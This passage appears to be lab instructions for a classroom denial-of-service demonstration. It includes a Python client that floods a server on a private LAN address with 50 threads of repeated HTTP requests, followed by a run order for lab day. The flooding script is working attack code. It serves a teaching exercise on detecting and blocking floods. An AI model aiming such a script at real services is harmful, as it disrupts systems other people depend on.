
pythonimport socket
import threading
import time

SERVER_IP = '192.168.1.XX'   # replace with your server laptop IP
PORT      = 9999
THREADS   = 50

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((SERVER_IP, PORT))
            s.send(b"GET /heavy_query HTTP/1.0\r\n\r\n")
            response = s.recv(1024).decode()
            if "BLOCKED" in response:
                print(f"BLOCKED by server")
                time.sleep(2)
            s.close()
        except:
            pass

print(f"Starting attack on {SERVER_IP}:{PORT} with {THREADS} threads...")

for i in range(THREADS):
    threading.Thread(target=attack, daemon=True).start()

time.sleep(60)
print("Attack ended.")
```

---

**Order of execution on lab day**

Run these in this exact order:
```
1. Start XAMPP — Apache + MySQL green
2. Open browser — http://localhost/dashboard/live_dashboard.php
3. Terminal 1 on your laptop — python server.py
4. Each lab PC — update SERVER_IP in client.py then python client.py
5. Watch terminal + dashboard update live